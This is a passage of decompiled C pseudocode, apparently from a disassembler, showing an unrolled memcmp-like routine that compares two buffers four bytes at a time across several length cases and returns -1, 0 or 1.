       iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00452924:\n        uVar4 = *(arg_8h + (arg_10h - 0x18));\n        uVar6 = *(arg_ch + (arg_10h - 0x18));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x004529de:\n        uVar4 = *(arg_8h + (arg_10h - 0x14));\n        uVar6 = *(arg_ch + (arg_10h - 0x14));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00452a92:\n        uVar4 = *(arg_8h + (arg_10h - 0x10));\n        uVar6 = *(arg_ch + (arg_10h - 0x10));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00452b4c:\n        uVar4 = *(arg_8h + (arg_10h - 0xc));\n        uVar6 = *(arg_ch + (arg_10h - 0xc));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00452c06:\n        uVar4 = *(arg_8h + (arg_10h - 8));\n        uVar6 = *(arg_ch + (arg_10h - 8));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00452cc0:\n        uVar4 = *(arg_8h + (arg_10h - 4));\n        uVar6 = *(arg_ch + (arg_10h - 4));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 == 0) {\ncode_r0x00452d68:\n            iVar5 = 0;\n        }\n        return iVar5;\n    case 0x1d:\n        uVar4 = *(arg_8h + (arg_10h - 0x1d));\n        uVar6 = *(arg_ch + (arg_10h - 0x1d));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n    case 0x19:\n        uVar4 = *(arg_8h + (arg_10h - 0x19));\n        uVar6 = *(arg_ch + (arg_10h - 0x19));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00452ed9:\n        uVar4 = *(arg_8h + (arg_10h - 0x15));\n        uVar6 = *(arg_ch + (arg_10h - 0x15));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00452f8d:\n        uVar4 = *(arg_8h + (arg_10h - 0x11));\n        uVar6 = *(arg_ch + (arg_10h - 0x11));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453047:\n        uVar4 = *(arg_8h + (arg_10h - 0xd));\n        uVar6 = *(arg_ch + (arg_10h - 0xd));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x004530fb:\n        uVar4 = *(arg_8h + (arg_10h - 9));\n        uVar6 = *(arg_ch + (arg_10h - 9));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x004531b5:\n        uVar4 = *(arg_8h + (arg_10h - 5));\n        uVar6 = *(arg_ch + (arg_10h - 5));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453269:\n        uVar6 = *(arg_8h + (arg_10h - 1));\n        uVar4 = *(arg_ch + (arg_10h - 1));\ncode_r0x00453271:\n        if (uVar6 == uVar4) {\n            return 0;\n        }\n        return (0 < uVar6 - uVar4) * 2 + -1;\n    case 0x1e:\n        uVar4 = *(arg_8h + (arg_10h - 0x1e));\n        uVar6 = *(arg_ch + (arg_10h - 0x1e));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453346:\n        uVar4 = *(arg_8h + (arg_10h - 0x1a));\n        uVar6 = *(arg_ch + (arg_10h - 0x1a));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x004533fa:\n        uVar4 = *(arg_8h + (arg_10h - 0x16));\n        uVar6 = *(arg_ch + (arg_10h - 0x16));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x004534b4:\n        uVar4 = *(arg_8h + (arg_10h - 0x12));\n        uVar6 = *(arg_ch + (arg_10h - 0x12));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453568:\n        uVar4 = *(arg_8h + (arg_10h - 0xe));\n        uVar6 = *(arg_ch + (arg_10h - 0xe));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453622:\n        uVar4 = *(arg_8h + (arg_10h - 10));\n        uVar6 = *(arg_ch + (arg_10h - 10));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x004536d6:\n        uVar4 = *(arg_8h + (arg_10h - 6));\n        uVar6 = *(arg_ch + (arg_10h - 6));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453790:\n        uVar1 = *(arg_8h + (arg_10h - 2));\n        uVar2 = *(arg_ch + (arg_10h - 2));\n        uVar6 = uVar1 >> 8;\n        uVar4 = uVar2 >> 8;\n        if (uVar1 != uVar2) {\n            iVar5 = (uVar1 & 0xff) - uVar2;\n            if (iVar5 != 0) {\ncode_r0x00453ce6:\n                return (0 < iVar5) * 2 + -1;\n            }\n            goto code_r0x00453271;\n        }\n        goto code_r0x00452d68;\n    case 0x1f:\n        uVar4 = *(arg_8h + (arg_10h - 0x1f));\n        uVar6 = *(arg_ch + (arg_10h - 0x1f));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453886:\n        uVar4 = *(arg_8h + (arg_10h - 0x1b));\n        uVar6 = *(arg_ch + (arg_10h - 0x1b));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453940:\n        uVar4 = *(arg_8h + (arg_10h - 0x17));\n        uVar6 = *(arg_ch + (arg_10h - 0x17));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x004539f4:\n        uVar4 = *(arg_8h + (arg_10h - 0x13));\n        uVar6 = *(arg_ch + (arg_10h - 0x13));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453aa8:\n        uVar4 = *(arg_8h + (arg_10h - 0xf));\n        uVar6 = *(arg_ch + (arg_10h - 0xf));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = (uVar4 & 0xff) - (uVar6 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            iVar5 = (uVar4 >> 8 & 0xff) - (uVar6 >> 8 & 0xff);\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            uVar3 = uVar6 >> 0x10 & 0xff;\n            uVar7 = uVar4 >> 0x10 & 0xff;\n            if (uVar7 == uVar3) {\n                iVar5 = (uVar4 >> 0x18) - (uVar6 >> 0x18);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            else {\n                iVar5 = (uVar7 != uVar3 && -1 < uVar7 - uVar3) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\ncode_r0x00453b5c:\n        uVar4 = *(arg_8h + (arg_10h - 0xb));\n        uVar6 = *(arg_ch + (arg_10h - 0xb));\n        if (uVar4 == uVar6) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 